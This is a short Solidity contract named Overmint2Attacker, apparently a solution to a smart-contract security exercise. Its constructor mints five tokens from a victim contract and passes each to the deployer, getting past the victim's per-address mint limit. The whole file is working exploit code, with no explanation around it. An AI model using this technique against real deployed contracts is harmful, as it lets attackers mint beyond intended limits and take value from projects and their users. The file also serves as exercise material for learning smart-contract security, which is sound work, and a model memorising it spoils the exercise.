// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../Overmint2.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint2Attacker is IERC721Receiver {
    Overmint2 public victimContract;
    uint recursionCount = 0;
    constructor(address _victimContract) {
        victimContract = Overmint2(_victimContract);
        for (uint i = 1; i < 6; i++) {
            victimContract.mint();
            victimContract.safeTransferFrom(address(this), msg.sender, i);
        }
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
